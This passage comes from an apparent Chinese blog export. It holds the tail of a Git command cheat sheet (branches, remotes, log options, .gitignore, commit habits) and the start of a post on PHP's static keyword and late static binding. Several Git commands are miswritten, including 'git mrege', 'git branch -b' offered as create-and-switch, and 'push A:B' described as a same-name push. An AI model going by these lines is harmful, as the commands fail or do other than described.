title="变基冲突解决后我该做什么？"></a>变基冲突解决后我该做什么？</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rebase --<span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="变基过程中我想放弃变基"><a href="#变基过程中我想放弃变基" class="headerlink" title="变基过程中我想放弃变基"></a>变基过程中我想放弃变基</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git rebase --<span class="keyword">abort</span></span><br></pre></td></tr></table></figure><h2 id="分支-1"><a href="#分支-1" class="headerlink" title="分支"></a>分支</h2><h3 id="怎么切换分支？"><a href="#怎么切换分支？" class="headerlink" title="怎么切换分支？"></a>怎么切换分支？</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout <span class="string">[branch name]</span></span><br></pre></td></tr></table></figure><h3 id="怎么切换到上一个分支？"><a href="#怎么切换到上一个分支？" class="headerlink" title="怎么切换到上一个分支？"></a>怎么切换到上一个分支？</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git checkout -</span><br></pre></td></tr></table></figure><h3 id="我当前在test分支，并想将ver1-0合并到test分支"><a href="#我当前在test分支，并想将ver1-0合并到test分支" class="headerlink" title="我当前在test分支，并想将ver1.0合并到test分支"></a>我当前在<code>test</code>分支，并想将<code>ver1.0</code>合并到<code>test</code>分支</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git mrege ver1<span class="number">.0</span></span><br></pre></td></tr></table></figure><h3 id="我想取消合并"><a href="#我想取消合并" class="headerlink" title="我想取消合并"></a>我想取消合并</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git merge --<span class="keyword">abort</span></span><br></pre></td></tr></table></figure><h3 id="怎么查看已经合并的分支？"><a href="#怎么查看已经合并的分支？" class="headerlink" title="怎么查看已经合并的分支？"></a>怎么查看已经合并的分支？</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch <span class="comment">--merged</span></span><br></pre></td></tr></table></figure><h3 id="怎么查看还未合并的分支？"><a href="#怎么查看还未合并的分支？" class="headerlink" title="怎么查看还未合并的分支？"></a>怎么查看还未合并的分支？</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git branch --<span class="keyword">no</span>-merged</span><br></pre></td></tr></table></figure><h3 id="我想新建一个分支"><a href="#我想新建一个分支" class="headerlink" title="我想新建一个分支"></a>我想新建一个分支</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>[<span class="keyword">branch </span>name]</span><br></pre></td></tr></table></figure><h3 id="我想新建并切换到新分支"><a href="#我想新建并切换到新分支" class="headerlink" title="我想新建并切换到新分支"></a>我想新建并切换到新分支</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>-<span class="keyword">b </span>[<span class="keyword">branch </span>name]</span><br></pre></td></tr></table></figure><h3 id="我想删除已合并的分支"><a href="#我想删除已合并的分支" class="headerlink" title="我想删除已合并的分支"></a>我想删除已合并的分支</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>-d [<span class="keyword">branch </span>name]</span><br></pre></td></tr></table></figure><h3 id="我想强制删除未合并的分支"><a href="#我想强制删除未合并的分支" class="headerlink" title="我想强制删除未合并的分支"></a>我想强制删除未合并的分支</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>-D [<span class="keyword">brnach </span>name]</span><br></pre></td></tr></table></figure><h3 id="我想将另一个分支的某次提交应用到当前分支"><a href="#我想将另一个分支的某次提交应用到当前分支" class="headerlink" title="我想将另一个分支的某次提交应用到当前分支"></a>我想将另一个分支的某次提交应用到当前分支</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git cherry-pick [<span class="keyword">commit</span>-<span class="keyword">id</span>]</span><br></pre></td></tr></table></figure><h3 id="怎么修改分支名？"><a href="#怎么修改分支名？" class="headerlink" title="怎么修改分支名？"></a>怎么修改分支名？</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -m [<span class="built_in">old</span> <span class="type">name</span>] [<span class="built_in">new</span> <span class="type">name</span>]</span><br></pre></td></tr></table></figure><h3 id="怎么将本地分支与远程分支建立跟踪关系？"><a href="#怎么将本地分支与远程分支建立跟踪关系？" class="headerlink" title="怎么将本地分支与远程分支建立跟踪关系？"></a>怎么将本地分支与远程分支建立跟踪关系？</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch -t <span class="string">[branch name]</span> <span class="string">[remote-branch]</span></span><br></pre></td></tr></table></figure><h3 id="怎么查看远程分支？"><a href="#怎么查看远程分支？" class="headerlink" title="怎么查看远程分支？"></a>怎么查看远程分支？</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">branch </span>-r</span><br></pre></td></tr></table></figure><h3 id="我本地没有别人新推送的远程分支"><a href="#我本地没有别人新推送的远程分支" class="headerlink" title="我本地没有别人新推送的远程分支"></a>我本地没有别人新推送的远程分支</h3><p>请使用<code>git fetch</code>命令更新一下</p><h3 id="远程仓库名为origin，怎么将本地的-A-分支推送到远程并建立同名分支？"><a href="#远程仓库名为origin，怎么将本地的-A-分支推送到远程并建立同名分支？" class="headerlink" title="远程仓库名为origin，怎么将本地的 A 分支推送到远程并建立同名分支？"></a>远程仓库名为origin，怎么将本地的 A 分支推送到远程并建立同名分支？</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">push</span> -u <span class="built_in">origin</span> A:B</span><br></pre></td></tr></table></figure><h3 id="远程仓库名为origin，我想删除origin的分支B"><a href="#远程仓库名为origin，我想删除origin的分支B" class="headerlink" title="远程仓库名为origin，我想删除origin的分支B"></a>远程仓库名为origin，我想删除origin的分支B</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git push -u origin <span class="symbol">:B</span></span><br></pre></td></tr></table></figure><h3 id="我将-5-个提交推送到了远程仓库，但发现第3个提交需要撤回，我该如何操作？"><a href="#我将-5-个提交推送到了远程仓库，但发现第3个提交需要撤回，我该如何操作？" class="headerlink" title="我将 5 个提交推送到了远程仓库，但发现第3个提交需要撤回，我该如何操作？"></a>我将 5 个提交推送到了远程仓库，但发现第3个提交需要撤回，我该如何操作？</h3><p>此时，你应该使用<code>git revert [commit-id]</code>，无论这个提交在log的哪个位置，都不会影响上下的提交，而且它会将撤销的作为一个新的提交，因此<code>revert</code>命令主要用于推送到远程仓库的修改。</p><p>如果你使用了<code>git reset</code>会有什么不同呢？</p><p>如果一个提交在log的中间位置，那么reset这个提交 之后的提交有可能都会消失掉！尤其在多人协作中，你将后两个提交删除，并推送到远程，而别人本地还是 5 个提交，这将导致分支的混乱，请清楚你的每一步操作与后果，谨慎使用每个命令。</p><h2 id="远程仓库-1"><a href="#远程仓库-1" class="headerlink" title="远程仓库"></a>远程仓库</h2><h3 id="怎么查看所有关联的远程仓库名称"><a href="#怎么查看所有关联的远程仓库名称" class="headerlink" title="怎么查看所有关联的远程仓库名称"></a>怎么查看所有关联的远程仓库名称</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git remote</span><br></pre></td></tr></table></figure><h3 id="我想查看远程仓库的地址"><a href="#我想查看远程仓库的地址" class="headerlink" title="我想查看远程仓库的地址"></a>我想查看远程仓库的地址</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git remote -v</span><br></pre></td></tr></table></figure><h3 id="我想将本地已有仓库与远程仓库关联"><a href="#我想将本地已有仓库与远程仓库关联" class="headerlink" title="我想将本地已有仓库与远程仓库关联"></a>我想将本地已有仓库与远程仓库关联</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote <span class="keyword">add</span><span class="bash"> 本地远程仓库名 url|path</span></span><br></pre></td></tr></table></figure><h3 id="我想取消远程仓库的关联"><a href="#我想取消远程仓库的关联" class="headerlink" title="我想取消远程仓库的关联"></a>我想取消远程仓库的关联</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>git remote rm 本地远程仓库名</span><br></pre></td></tr></table></figure><h3 id="我想重命名远程仓库"><a href="#我想重命名远程仓库" class="headerlink" title="我想重命名远程仓库"></a>我想重命名远程仓库</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote <span class="keyword">rename</span> [<span class="built_in">old</span> <span class="type">name</span>] [<span class="built_in">new</span> <span class="type">name</span>]</span><br></pre></td></tr></table></figure><h2 id="检索"><a href="#检索" class="headerlink" title="检索"></a>检索</h2><h3 id="我想在项目中查找某个关键词，并输出所在行号"><a href="#我想在项目中查找某个关键词，并输出所在行号" class="headerlink" title="我想在项目中查找某个关键词，并输出所在行号"></a>我想在项目中查找某个关键词，并输出所在行号</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git grep <span class="string">[-n]</span> <span class="string">[keyword]</span></span><br></pre></td></tr></table></figure><h3 id="我想查看搜索结果所属方法或函数"><a href="#我想查看搜索结果所属方法或函数" class="headerlink" title="我想查看搜索结果所属方法或函数"></a>我想查看搜索结果所属方法或函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git grep -<span class="selector-tag">p</span> [keyword]</span><br></pre></td></tr></table></figure><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p><code>git log</code>中有很多参数能够帮助我们增强筛选，常用的选项如下表</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-p</code></td><td>按补丁格式显示每个更新之间的差异。</td></tr><tr><td><code>--stat</code></td><td>显示每次更新的文件修改统计信息。</td></tr><tr><td><code>--shortstat</code></td><td>只显示 –stat 中最后的行数修改添加移除统计。</td></tr><tr><td><code>--name-only</code></td><td>仅在提交信息后显示已修改的文件清单。</td></tr><tr><td><code>--name-status</code></td><td>显示新增、修改、删除的文件清单。</td></tr><tr><td><code>--abbrev-commit</code></td><td>仅显示 SHA-1 的前几个字符，而非所有的 40 个字符。</td></tr><tr><td><code>--relative-date</code></td><td>使用较短的相对时间显示（比如，“2 weeks ago”）。</td></tr><tr><td><code>--graph</code></td><td>显示 ASCII 图形表示的分支合并历史。</td></tr><tr><td><code>--pretty</code></td><td>使用其他格式显示历史提交信息。可用的选项包括 oneline，short，full，fuller 和 format（后跟指定格式）。</td></tr></tbody></table><p><code>git log --pretty=format</code> 常用的选项如下表：</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>%H</code></td><td>提交对象（commit）的完整哈希字串</td></tr><tr><td><code>%h</code></td><td>提交对象的简短哈希字串</td></tr><tr><td><code>%T</code></td><td>树对象（tree）的完整哈希字串</td></tr><tr><td><code>%t</code></td><td>树对象的简短哈希字串</td></tr><tr><td><code>%P</code></td><td>父对象（parent）的完整哈希字串</td></tr><tr><td><code>%p</code></td><td>父对象的简短哈希字串</td></tr><tr><td><code>%an</code></td><td>作者（author）的名字</td></tr><tr><td><code>%ae</code></td><td>作者的电子邮件地址</td></tr><tr><td><code>%ad</code></td><td>作者修订日期（可以用 –date= 选项定制格式）</td></tr><tr><td><code>%ar</code></td><td>作者修订日期，按多久以前的方式显示</td></tr><tr><td><code>%cn</code></td><td>提交者（committer）的名字</td></tr><tr><td><code>%ce</code></td><td>提交者的电子邮件地址</td></tr><tr><td><code>%cd</code></td><td>提交日期</td></tr><tr><td><code>%cr</code></td><td>提交日期，按多久以前的方式显示</td></tr><tr><td><code>%s</code></td><td>提交说明</td></tr></tbody></table><p>限制 <code>git log</code> 输出的选项</p><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td><code>-(n)</code></td><td>仅显示最近的 n 条提交</td></tr><tr><td><code>--since, --after</code></td><td>仅显示指定时间之后的提交。</td></tr><tr><td><code>--until, --before</code></td><td>仅显示指定时间之前的提交。</td></tr><tr><td><code>--author</code></td><td>仅显示指定作者相关的提交。</td></tr><tr><td><code>--committer</code></td><td>仅显示指定提交者相关的提交。</td></tr><tr><td><code>--grep</code></td><td>仅显示含指定关键字的提交</td></tr><tr><td><code>-S</code></td><td>仅显示添加或移除了某个关键字的提交</td></tr></tbody></table><h3 id="我想查看某次提交信息"><a href="#我想查看某次提交信息" class="headerlink" title="我想查看某次提交信息"></a>我想查看某次提交信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">show</span> [<span class="keyword">commit</span>-<span class="keyword">id</span>]</span><br></pre></td></tr></table></figure><h3 id="我想查看某次提交修改的文件列表"><a href="#我想查看某次提交修改的文件列表" class="headerlink" title="我想查看某次提交修改的文件列表"></a>我想查看某次提交修改的文件列表</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git show <span class="params">--pretty=</span><span class="string">""</span> <span class="params">--name-only</span> [commit-id]</span><br></pre></td></tr></table></figure><h3 id="查看某次提交的变更内容"><a href="#查看某次提交的变更内容" class="headerlink" title="查看某次提交的变更内容"></a>查看某次提交的变更内容</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">show</span> <span class="comment">--pretty="" [commit-id]</span></span><br></pre></td></tr></table></figure><h3 id="我想查看某个文件的所有提交信息"><a href="#我想查看某个文件的所有提交信息" class="headerlink" title="我想查看某个文件的所有提交信息"></a>我想查看某个文件的所有提交信息</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git <span class="built-in">log</span> -p [filename]</span><br></pre></td></tr></table></figure><h3 id="我想查看最近两次的提交信息"><a href="#我想查看最近两次的提交信息" class="headerlink" title="我想查看最近两次的提交信息"></a>我想查看最近两次的提交信息</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> git <span class="built-in">log</span> -p <span class="number">-2</span></span><br></pre></td></tr></table></figure><h3 id="我想查看某个文件的所有变动及统计信息"><a href="#我想查看某个文件的所有变动及统计信息" class="headerlink" title="我想查看某个文件的所有变动及统计信息"></a>我想查看某个文件的所有变动及统计信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git whatchanged --<span class="built_in">stat</span> [filename]</span></span><br></pre></td></tr></table></figure><h3 id="我想修改最近一次提交信息"><a href="#我想修改最近一次提交信息" class="headerlink" title="我想修改最近一次提交信息"></a>我想修改最近一次提交信息</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="keyword">commit</span> <span class="comment">--amend</span></span><br></pre></td></tr></table></figure><h3 id="某行代码有问题，我想查看谁最后修改了这里"><a href="#某行代码有问题，我想查看谁最后修改了这里" class="headerlink" title="某行代码有问题，我想查看谁最后修改了这里"></a>某行代码有问题，我想查看谁最后修改了这里</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git blame [-L <span class="built_in">start</span>-<span class="built_in">line</span>, <span class="keyword">end</span>-<span class="built_in">line</span>] filename</span><br></pre></td></tr></table></figure><h3 id="我想查看某个用户在某个时间段内的所有提交，并仅输出简短hash与提交说明"><a href="#我想查看某个用户在某个时间段内的所有提交，并仅输出简短hash与提交说明" class="headerlink" title="我想查看某个用户在某个时间段内的所有提交，并仅输出简短hash与提交说明"></a>我想查看某个用户在某个时间段内的所有提交，并仅输出简短hash与提交说明</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log <span class="attribute">--pretty</span>=<span class="string">"%h - %s"</span> <span class="attribute">--author</span>=Rock <span class="attribute">--since</span>=<span class="string">"2008-10-01"</span> <span class="attribute">--before</span>=<span class="string">"2008-11-01"</span></span><br></pre></td></tr></table></figure><h3 id="我想用图形的方式查看分支的变化"><a href="#我想用图形的方式查看分支的变化" class="headerlink" title="我想用图形的方式查看分支的变化"></a>我想用图形的方式查看分支的变化</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> <span class="comment">--oneline --graph</span></span><br></pre></td></tr></table></figure><h2 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h2><ul><li><code>**/*.go</code> 忽略所有目录中的扩展名为go的文件</li><li><code>*/*/temp*</code>忽略二级目录下以temp开头的所有文件</li><li><code>temp?</code>忽略以temp开头的文件名，如<code>tempa</code>和<code>tempb</code></li><li><code>!README.md</code>感叹号(<code>!</code>)表示不忽略该文件</li></ul><h2 id="版本控制最佳实践"><a href="#版本控制最佳实践" class="headerlink" title="版本控制最佳实践"></a>版本控制最佳实践</h2><h3 id="鼓励频繁提交"><a href="#鼓励频繁提交" class="headerlink" title="鼓励频繁提交"></a>鼓励频繁提交</h3><p>频繁提交，而不要等到代码没有问题了再一次性提交。对于可能损坏主干原则的代码，不要直接提交到主干，而是创建一个分支，在分支中频繁提交。</p><h3 id="定义主干原则，并且坚守它"><a href="#定义主干原则，并且坚守它" class="headerlink" title="定义主干原则，并且坚守它"></a>定义主干原则，并且坚守它</h3><p>“主干的代码必须是可以发布并且不会产生bug的”，如果不能保证新增或修改的代码符合这一原则，就在分支提交代码。</p><h3 id="不要把逻辑的修改和代码格式化操作混在一起"><a href="#不要把逻辑的修改和代码格式化操作混在一起" class="headerlink" title="不要把逻辑的修改和代码格式化操作混在一起"></a>不要把逻辑的修改和代码格式化操作混在一起</h3><p>如果你做了一些代码格式化的操作，就单独提交这次修改，然后再做一些逻辑的修改后提交，这样可以在出现问题时容易追溯。</p><h3 id="不相干的代码分开提交"><a href="#不相干的代码分开提交" class="headerlink" title="不相干的代码分开提交"></a>不相干的代码分开提交</h3><p>也就是说不要在一次提交里修复两个bug</p>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈PHP中的static关键字</title>
      <link href="/post/php-static/"/>
      <url>/post/php-static/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm4yvhsgj30ci05kt99.jpg" alt=""></p><a id="more"></a><h2 id="static-的几种使用情况："><a href="#static-的几种使用情况：" class="headerlink" title="static 的几种使用情况："></a>static 的几种使用情况：</h2><h3 id="1-静态变量"><a href="#1-静态变量" class="headerlink" title="1. 静态变量"></a>1. 静态变量</h3><p>静态变量仅在局部函数域中存在，但当程序执行离开此作用域时，其值并不丢失。看看下面的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testStatic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $val = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">echo</span> $val;</span><br><span class="line">    $val++;</span><br><span class="line">&#125;</span><br><span class="line">testStatic();   <span class="comment">//output 1</span></span><br><span class="line">testStatic();   <span class="comment">//output 2</span></span><br><span class="line">testStatic();   <span class="comment">//output 3</span></span><br></pre></td></tr></table></figure><p>如果不声明<code>static</code>，则每次<code>$val</code>的值都会初始化为1。这是由于<code>static</code>关键字会在请求初始化时存储与静态存储区，并存在于整个请求生命周期内，而普通变量则存在于栈区，函数执行结束时这些存储单元自动被释放。</p><h3 id="2-静态属性"><a href="#2-静态属性" class="headerlink" title="2. 静态属性"></a>2. 静态属性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">roster</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-静态方法"><a href="#3-静态方法" class="headerlink" title="3. 静态方法"></a>3. 静态方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">roster</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-后期静态绑定"><a href="#4-后期静态绑定" class="headerlink" title="4. 后期静态绑定"></a>4. 后期静态绑定</h3><p>首先，后期静态绑定这个词怎么理解，官方手册对这个解释的很清楚，这里引用一下：『“后期绑定”的意思是说，static:: 不再被解析为定义当前方法所在的类，而是在实际运行时计算的。也可以称之为“静态绑定”，因为它可以用于（但<strong>不限于</strong>）静态方法的调用。』</p><p>接下来，让我们用几个例子来具体说明一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::who(); <span class="comment">// 后期静态绑定从这里开始</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">B::test();</span><br></pre></td></tr></table></figure><p>这段代码的最终输出是什么？<code>A</code>还是<code>B</code>？</p><p>让我们来运行一下，发现结果是<code>B</code>。这是为什么呢？</p><p>因为当我们调用<code>B</code>中的静态方法<code>test()</code>时，B 中不存在，于是向上查找（调用查找顺序依次为 当前类 ==&gt; trait ==&gt; 父类），当在父类<code>A</code>中找到时，执行<code>static::who()</code>。（这里的<code>static</code>与我们常用的<code>self</code>关键字不同，如果是<code>self</code>，则只会向上查找，而<code>static</code>则会向下查找，具体调用方法也是在运行时确定的）因此接下来调用的是<code>B</code>中的 <code>who()</code>，而非<code>A</code>中的<code>who()</code>，最终也就自然输出为<code>B</code>。</p><p>需要注意的是，后期静态绑定的解析会一直到取得一个完全解析了的静态调用为止(即最下层可执行的方法)。另一方面，如果静态调用使用 <code>parent::</code> 或者 <code>self::</code> 将转发调用信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::who();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        A::foo();</span><br><span class="line">        <span class="keyword">parent</span>::foo();</span><br><span class="line">        <span class="keyword">self</span>::foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C::test();<span class="comment">// A C C</span></span><br></pre></td></tr></table></figure><h2 id="What-amp-When"><a href="#What-amp-When" class="headerlink" title="What &amp; When"></a>What &amp; When</h2><p>现在，让我们来看一下什么是<code>static</code>，以及什么时候该使用<code>static</code>。</p><h3 id="什么是static？"><a href="#什么是static？" class="headerlink" title="什么是static？"></a>什么是static？</h3><p>如果我们在代码中声明了<code>static</code>关键字，代码在初始化阶段会与常量、全局变量一同存储在一段连续空间内（静态存储区），这会存在于整个请求周期，除非我们手动销毁。</p><p>由于这些值是在初始化时确定的，相比于在运行时确定的值，就是“静态”(<code>static</code>)的。</p><h3 id="什么时候用？"><a href="#什么时候用？" class="headerlink" 